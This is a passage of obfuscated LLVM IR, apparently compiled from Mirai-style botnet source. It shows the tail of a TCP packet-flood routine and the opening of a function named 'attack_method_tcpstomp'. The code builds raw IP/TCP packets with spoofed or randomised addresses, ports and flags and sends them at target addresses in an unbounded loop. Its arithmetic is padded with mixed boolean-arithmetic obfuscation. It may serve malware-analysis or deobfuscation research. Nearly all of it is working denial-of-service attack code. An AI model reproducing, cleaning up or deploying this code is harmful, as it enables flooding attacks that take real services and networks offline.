  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %657

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %657

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %464, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %469

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 15, -1
  %145 = xor i8 %143, %144
  %146 = and i8 %145, %143
  %147 = and i8 %143, 15
  %148 = xor i8 %146, -1
  %149 = xor i8 64, -1
  %150 = xor i8 6, -1
  %151 = and i8 %148, 6
  %152 = and i8 %146, %150
  %153 = and i8 %149, 6
  %154 = and i8 64, %150
  %155 = or i8 %151, %152
  %156 = or i8 %153, %154
  %157 = xor i8 %155, %156
  %158 = or i8 %148, %149
  %159 = xor i8 %158, -1
  %160 = or i8 6, %150
  %161 = and i8 %159, %160
  %162 = or i8 %157, %161
  %163 = or i8 %146, 64
  store i8 %162, i8* %142, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %165 = bitcast %struct.iphdr* %164 to i8*
  %166 = load i8, i8* %165, align 4
  %167 = xor i8 %166, -1
  %168 = xor i8 -16, -1
  %169 = xor i8 120, -1
  %170 = or i8 %167, %168
  %171 = or i8 120, %169
  %172 = xor i8 %170, -1
  %173 = and i8 %172, %171
  %174 = and i8 %166, -16
  %175 = xor i8 %173, -1
  %176 = xor i8 5, -1
  %177 = xor i8 102, -1
  %178 = and i8 %175, 102
  %179 = and i8 %173, %177
  %180 = and i8 %176, 102
  %181 = and i8 5, %177
  %182 = or i8 %178, %179
  %183 = or i8 %180, %181
  %184 = xor i8 %182, %183
  %185 = or i8 %175, %176
  %186 = xor i8 %185, -1
  %187 = or i8 102, %177
  %188 = and i8 %186, %187
  %189 = or i8 %184, %188
  %190 = or i8 %173, 5
  store i8 %189, i8* %165, align 4
  %191 = load i8, i8* %12, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 1
  store i8 %191, i8* %193, align 1
  %194 = load i32, i32* %26, align 4
  %195 = sext i32 %194 to i64
  %196 = sub i64 0, %195
  %197 = sub i64 40, %196
  %198 = add i64 40, %195
  %199 = trunc i64 %197 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  store i16 %200, i16* %202, align 2
  %203 = load i16, i16* %13, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 3
  store i16 %204, i16* %206, align 4
  %207 = load i8, i8* %14, align 1
  %208 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 5
  store i8 %207, i8* %209, align 4
  %210 = load i8, i8* %15, align 1
  %211 = icmp ne i8 %210, 0
  br i1 %211, label %212, label %216

; <label>:212:                                    ; preds = %123
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %212, %123
  %217 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 6
  store i8 6, i8* %218, align 1
  %219 = load i32, i32* %28, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 8
  store i32 %219, i32* %221, align 4
  %222 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 1
  %227 = load i32, i32* %226, align 4
  %228 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 9
  store i32 %227, i32* %229, align 4
  %230 = load i16, i16* %16, align 2
  %231 = call zeroext i16 @htons(i16 zeroext %230) #7
  %232 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  store i16 %231, i16* %233, align 4
  %234 = load i16, i16* %17, align 2
  %235 = call zeroext i16 @htons(i16 zeroext %234) #7
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 1
  store i16 %235, i16* %237, align 2
  %238 = load i32, i32* %18, align 4
  %239 = trunc i32 %238 to i16
  %240 = call zeroext i16 @htons(i16 zeroext %239) #7
  %241 = zext i16 %240 to i32
  %242 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 2
  store i32 %241, i32* %243, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = xor i16 %246, -1
  %248 = xor i16 -241, -1
  %249 = xor i16 -1669, -1
  %250 = or i16 %247, %248
  %251 = or i16 -1669, %249
  %252 = xor i16 %250, -1
  %253 = and i16 %252, %251
  %254 = and i16 %246, -241
  %255 = xor i16 %253, -1
  %256 = xor i16 80, -1
  %257 = xor i16 -4143, -1
  %258 = and i16 %255, -4143
  %259 = and i16 %253, %257
  %260 = and i16 %256, -4143
  %261 = and i16 80, %257
  %262 = or i16 %258, %259
  %263 = or i16 %260, %261
  %264 = xor i16 %262, %263
  %265 = or i16 %255, %256
  %266 = xor i16 %265, -1
  %267 = or i16 -4143, %257
  %268 = and i16 %266, %267
  %269 = or i16 %264, %268
  %270 = or i16 %253, 80
  store i16 %269, i16* %245, align 4
  %271 = load i8, i8* %20, align 1
  %272 = sext i8 %271 to i16
  %273 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 4
  %275 = load i16, i16* %274, align 4
  %276 = xor i16 1, -1
  %277 = xor i16 %272, %276
  %278 = and i16 %277, %272
  %279 = and i16 %272, 1
  %280 = shl i16 %278, 13
  %281 = xor i16 %275, -1
  %282 = xor i16 -8193, -1
  %283 = xor i16 12403, -1
  %284 = or i16 %281, %282
  %285 = or i16 12403, %283
  %286 = xor i16 %284, -1
  %287 = and i16 %286, %285
  %288 = and i16 %275, -8193
  %289 = xor i16 %287, -1
  %290 = xor i16 %280, -1
  %291 = xor i16 24988, -1
  %292 = and i16 %289, 24988
  %293 = and i16 %287, %291
  %294 = and i16 %290, 24988
  %295 = and i16 %280, %291
  %296 = or i16 %292, %293
  %297 = or i16 %294, %295
  %298 = xor i16 %296, %297
  %299 = or i16 %289, %290
  %300 = xor i16 %299, -1
  %301 = or i16 24988, %291
  %302 = and i16 %300, %301
  %303 = or i16 %298, %302
  %304 = or i16 %287, %280
  store i16 %303, i16* %274, align 4
  %305 = load i8, i8* %21, align 1
  %306 = sext i8 %305 to i16
  %307 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 4
  %309 = load i16, i16* %308, align 4
  %310 = xor i16 1, -1
  %311 = xor i16 %306, %310
  %312 = and i16 %311, %306
  %313 = and i16 %306, 1
  %314 = shl i16 %312, 12
  %315 = xor i16 %309, -1
  %316 = xor i16 -4097, -1
  %317 = xor i16 -16083, -1
  %318 = or i16 %315, %316
  %319 = or i16 -16083, %317
  %320 = xor i16 %318, -1
  %321 = and i16 %320, %319
  %322 = and i16 %309, -4097
  %323 = and i16 %321, %314
  %324 = xor i16 %321, %314
  %325 = or i16 %323, %324
  %326 = or i16 %321, %314
  store i16 %325, i16* %308, align 4
  %327 = load i8, i8* %22, align 1
  %328 = sext i8 %327 to i16
  %329 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %330 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %329, i32 0, i32 4
  %331 = load i16, i16* %330, align 4
  %332 = xor i16 %328, -1
  %333 = xor i16 1, -1
  %334 = xor i16 -23239, -1
  %335 = or i16 %332, %333
  %336 = or i16 -23239, %334
  %337 = xor i16 %335, -1
  %338 = and i16 %337, %336
  %339 = and i16 %328, 1
  %340 = shl i16 %338, 11
  %341 = xor i16 -2049, -1
  %342 = xor i16 %331, %341
  %343 = and i16 %342, %331
  %344 = and i16 %331, -2049
  %345 = and i16 %343, %340
  %346 = xor i16 %343, %340
  %347 = or i16 %345, %346
  %348 = or i16 %343, %340
  store i16 %347, i16* %330, align 4
  %349 = load i8, i8* %23, align 1
  %350 = sext i8 %349 to i16
  %351 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %352 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %351, i32 0, i32 4
  %353 = load i16, i16* %352, align 4
  %354 = xor i16 1, -1
  %355 = xor i16 %350, %354
  %356 = and i16 %355, %350
  %357 = and i16 %350, 1
  %358 = shl i16 %356, 10
  %359 = xor i16 -1025, -1
  %360 = xor i16 %353, %359
  %361 = and i16 %360, %353
  %362 = and i16 %353, -1025
  %363 = and i16 %361, %358
  %364 = xor i16 %361, %358
  %365 = or i16 %363, %364
  %366 = or i16 %361, %358
  store i16 %365, i16* %352, align 4
  %367 = load i8, i8* %24, align 1
  %368 = sext i8 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 4
  %371 = load i16, i16* %370, align 4
  %372 = xor i16 1, -1
  %373 = xor i16 %368, %372
  %374 = and i16 %373, %368
  %375 = and i16 %368, 1
  %376 = shl i16 %374, 9
  %377 = xor i16 %371, -1
  %378 = xor i16 -513, -1
  %379 = xor i16 31151, -1
  %380 = or i16 %377, %378
  %381 = or i16 31151, %379
  %382 = xor i16 %380, -1
  %383 = and i16 %382, %381
  %384 = and i16 %371, -513
  %385 = xor i16 %383, -1
  %386 = xor i16 %376, -1
  %387 = xor i16 17508, -1
  %388 = and i16 %385, 17508
  %389 = and i16 %383, %387
  %390 = and i16 %386, 17508
  %391 = and i16 %376, %387
  %392 = or i16 %388, %389
  %393 = or i16 %390, %391
  %394 = xor i16 %392, %393
  %395 = or i16 %385, %386
  %396 = xor i16 %395, -1
  %397 = or i16 17508, %387
  %398 = and i16 %396, %397
  %399 = or i16 %394, %398
  %400 = or i16 %383, %376
  store i16 %399, i16* %370, align 4
  %401 = load i8, i8* %25, align 1
  %402 = sext i8 %401 to i16
  %403 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 4
  %405 = load i16, i16* %404, align 4
  %406 = xor i16 %402, -1
  %407 = xor i16 1, -1
  %408 = xor i16 -9936, -1
  %409 = or i16 %406, %407
  %410 = or i16 -9936, %408
  %411 = xor i16 %409, -1
  %412 = and i16 %411, %410
  %413 = and i16 %402, 1
  %414 = shl i16 %412, 8
  %415 = xor i16 %405, -1
  %416 = xor i16 -257, -1
  %417 = xor i16 7844, -1
  %418 = or i16 %415, %416
  %419 = or i16 7844, %417
  %420 = xor i16 %418, -1
  %421 = and i16 %420, %419
  %422 = and i16 %405, -257
  %423 = and i16 %421, %414
  %424 = xor i16 %421, %414
  %425 = or i16 %423, %424
  %426 = or i16 %421, %414
  store i16 %425, i16* %404, align 4
  %427 = call i32 @rand_next()
  %428 = xor i32 65535, -1
  %429 = xor i32 %427, %428
  %430 = and i32 %429, %427
  %431 = and i32 %427, 65535
  %432 = trunc i32 %430 to i16
  %433 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 5
  store i16 %432, i16* %434, align 2
  %435 = load i8, i8* %22, align 1
  %436 = icmp ne i8 %435, 0
  br i1 %436, label %437, label %461

; <label>:437:                                    ; preds = %216
  %438 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %439 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %438, i32 0, i32 4
  %440 = load i16, i16* %439, align 4
  %441 = xor i16 -2049, -1
  %442 = xor i16 %440, %441
  %443 = and i16 %442, %440
  %444 = and i16 %440, -2049
  %445 = xor i16 %443, -1
  %446 = xor i16 2048, -1
  %447 = xor i16 -4153, -1
  %448 = and i16 %445, -4153
  %449 = and i16 %443, %447
  %450 = and i16 %446, -4153
  %451 = and i16 2048, %447
  %452 = or i16 %448, %449
  %453 = or i16 %450, %451
  %454 = xor i16 %452, %453
  %455 = or i16 %445, %446
  %456 = xor i16 %455, -1
  %457 = or i16 -4153, %447
  %458 = and i16 %456, %457
  %459 = or i16 %454, %458
  %460 = or i16 %443, 2048
  store i16 %459, i16* %439, align 4
  br label %461

; <label>:461:                                    ; preds = %437, %216
  %462 = load i8*, i8** %31, align 8
  %463 = load i32, i32* %26, align 4
  call void @rand_str(i8* %462, i32 %463)
  br label %464

; <label>:464:                                    ; preds = %461
  %465 = load i32, i32* %9, align 4
  %466 = sub i32 0, 1
  %467 = sub i32 %465, %466
  %468 = add nsw i32 %465, 1
  store i32 %467, i32* %9, align 4
  br label %118

; <label>:469:                                    ; preds = %118
  br label %470

; <label>:470:                                    ; preds = %656, %469
  store i32 0, i32* %9, align 4
  br label %471

; <label>:471:                                    ; preds = %650, %470
  %472 = load i32, i32* %9, align 4
  %473 = load i8, i8* %5, align 1
  %474 = zext i8 %473 to i32
  %475 = icmp slt i32 %472, %474
  br i1 %475, label %476, label %656

; <label>:476:                                    ; preds = %471
  %477 = load i8**, i8*** %11, align 8
  %478 = load i32, i32* %9, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds i8*, i8** %477, i64 %479
  %481 = load i8*, i8** %480, align 8
  store i8* %481, i8** %32, align 8
  %482 = load i8*, i8** %32, align 8
  %483 = bitcast i8* %482 to %struct.iphdr*
  store %struct.iphdr* %483, %struct.iphdr** %33, align 8
  %484 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i64 1
  %486 = bitcast %struct.iphdr* %485 to %struct.tcphdr*
  store %struct.tcphdr* %486, %struct.tcphdr** %34, align 8
  %487 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %488 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %487, i64 1
  %489 = bitcast %struct.tcphdr* %488 to i8*
  store i8* %489, i8** %35, align 8
  %490 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %491 = load i32, i32* %9, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i64 %492
  %494 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i32 0, i32 2
  %495 = load i8, i8* %494, align 4
  %496 = zext i8 %495 to i32
  %497 = icmp slt i32 %496, 32
  br i1 %497, label %498, label %521

; <label>:498:                                    ; preds = %476
  %499 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %500 = load i32, i32* %9, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %499, i64 %501
  %503 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %502, i32 0, i32 1
  %504 = load i32, i32* %503, align 4
  %505 = call i32 @ntohl(i32 %504) #7
  %506 = call i32 @rand_next()
  %507 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %508 = load i32, i32* %9, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %507, i64 %509
  %511 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %510, i32 0, i32 2
  %512 = load i8, i8* %511, align 4
  %513 = zext i8 %512 to i32
  %514 = lshr i32 %506, %513
  %515 = sub i32 0, %514
  %516 = sub i32 %505, %515
  %517 = add i32 %505, %514
  %518 = call i32 @htonl(i32 %516) #7
  %519 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %520 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %519, i32 0, i32 9
  store i32 %518, i32* %520, align 4
  br label %521

; <label>:521:                                    ; preds = %498, %476
  %522 = load i32, i32* %28, align 4
  %523 = icmp eq i32 %522, -1
  br i1 %523, label %524, label %528

; <label>:524:                                    ; preds = %521
  %525 = call i32 @rand_next()
  %526 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 8
  store i32 %525, i32* %527, align 4
  br label %528

; <label>:528:                                    ; preds = %524, %521
  %529 = load i16, i16* %13, align 2
  %530 = zext i16 %529 to i32
  %531 = icmp eq i32 %530, 65535
  br i1 %531, label %532, label %541

; <label>:532:                                    ; preds = %528
  %533 = call i32 @rand_next()
  %534 = xor i32 65535, -1
  %535 = xor i32 %533, %534
  %536 = and i32 %535, %533
  %537 = and i32 %533, 65535
  %538 = trunc i32 %536 to i16
  %539 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 3
  store i16 %538, i16* %540, align 4
  br label %541

; <label>:541:                                    ; preds = %532, %528
  %542 = load i16, i16* %16, align 2
  %543 = zext i16 %542 to i32
  %544 = icmp eq i32 %543, 65535
  br i1 %544, label %545, label %558

; <label>:545:                                    ; preds = %541
  %546 = call i32 @rand_next()
  %547 = xor i32 %546, -1
  %548 = xor i32 65535, -1
  %549 = xor i32 193888835, -1
  %550 = or i32 %547, %548
  %551 = or i32 193888835, %549
  %552 = xor i32 %550, -1
  %553 = and i32 %552, %551
  %554 = and i32 %546, 65535
  %555 = trunc i32 %553 to i16
  %556 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 0
  store i16 %555, i16* %557, align 4
  br label %558

; <label>:558:                                    ; preds = %545, %541
  %559 = load i16, i16* %17, align 2
  %560 = zext i16 %559 to i32
  %561 = icmp eq i32 %560, 65535
  br i1 %561, label %562, label %571

; <label>:562:                                    ; preds = %558
  %563 = call i32 @rand_next()
  %564 = xor i32 65535, -1
  %565 = xor i32 %563, %564
  %566 = and i32 %565, %563
  %567 = and i32 %563, 65535
  %568 = trunc i32 %566 to i16
  %569 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 1
  store i16 %568, i16* %570, align 2
  br label %571

; <label>:571:                                    ; preds = %562, %558
  %572 = load i32, i32* %18, align 4
  %573 = icmp eq i32 %572, 65535
  br i1 %573, label %574, label %578

; <label>:574:                                    ; preds = %571
  %575 = call i32 @rand_next()
  %576 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 2
  store i32 %575, i32* %577, align 4
  br label %578

; <label>:578:                                    ; preds = %574, %571
  %579 = load i32, i32* %19, align 4
  %580 = icmp eq i32 %579, 65535
  br i1 %580, label %581, label %585

; <label>:581:                                    ; preds = %578
  %582 = call i32 @rand_next()
  %583 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 3
  store i32 %582, i32* %584, align 4
  br label %585

; <label>:585:                                    ; preds = %581, %578
  %586 = load i8, i8* %27, align 1
  %587 = icmp ne i8 %586, 0
  br i1 %587, label %588, label %591

; <label>:588:                                    ; preds = %585
  %589 = load i8*, i8** %35, align 8
  %590 = load i32, i32* %26, align 4
  call void @rand_str(i8* %589, i32 %590)
  br label %591

; <label>:591:                                    ; preds = %588, %585
  %592 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %593 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %592, i32 0, i32 7
  store i16 0, i16* %593, align 2
  %594 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %595 = bitcast %struct.iphdr* %594 to i16*
  %596 = call zeroext i16 @checksum_generic(i16* %595, i32 20)
  %597 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %598 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %597, i32 0, i32 7
  store i16 %596, i16* %598, align 2
  %599 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %600 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %599, i32 0, i32 6
  store i16 0, i16* %600, align 4
  %601 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %602 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %603 = bitcast %struct.tcphdr* %602 to i8*
  %604 = load i32, i32* %26, align 4
  %605 = sext i32 %604 to i64
  %606 = add i64 20, 7815354567286358741
  %607 = add i64 %606, %605
  %608 = sub i64 %607, 7815354567286358741
  %609 = add i64 20, %605
  %610 = trunc i64 %608 to i16
  %611 = call zeroext i16 @htons(i16 zeroext %610) #7
  %612 = load i32, i32* %26, align 4
  %613 = sext i32 %612 to i64
  %614 = sub i64 20, 8335755103289882358
  %615 = add i64 %614, %613
  %616 = add i64 %615, 8335755103289882358
  %617 = add i64 20, %613
  %618 = trunc i64 %616 to i32
  %619 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %601, i8* %603, i16 zeroext %611, i32 %618)
  %620 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %621 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %620, i32 0, i32 6
  store i16 %619, i16* %621, align 4
  %622 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %623 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %622, i32 0, i32 1
  %624 = load i16, i16* %623, align 2
  %625 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %626 = load i32, i32* %9, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %625, i64 %627
  %629 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %628, i32 0, i32 0
  %630 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %629, i32 0, i32 1
  store i16 %624, i16* %630, align 2
  %631 = load i32, i32* %10, align 4
  %632 = load i8*, i8** %32, align 8
  %633 = load i32, i32* %26, align 4
  %634 = sext i32 %633 to i64
  %635 = sub i64 0, 40
  %636 = sub i64 0, %634
  %637 = add i64 %635, %636
  %638 = sub i64 0, %637
  %639 = add i64 40, %634
  %640 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %641 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %642 = load i32, i32* %9, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %641, i64 %643
  %645 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %644, i32 0, i32 0
  %646 = bitcast %struct.sockaddr_in* %645 to %struct.sockaddr*
  store %struct.sockaddr* %646, %struct.sockaddr** %640, align 8
  %647 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %648 = load %struct.sockaddr*, %struct.sockaddr** %647, align 8
  %649 = call i64 @sendto(i32 %631, i8* %632, i64 %638, i32 16384, %struct.sockaddr* %648, i32 16)
  br label %650

; <label>:650:                                    ; preds = %591
  %651 = load i32, i32* %9, align 4
  %652 = add i32 %651, 809335758
  %653 = add i32 %652, 1
  %654 = sub i32 %653, 809335758
  %655 = add nsw i32 %651, 1
  store i32 %654, i32* %9, align 4
  br label %471

; <label>:656:                                    ; preds = %471
  br label %470

; <label>:657:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
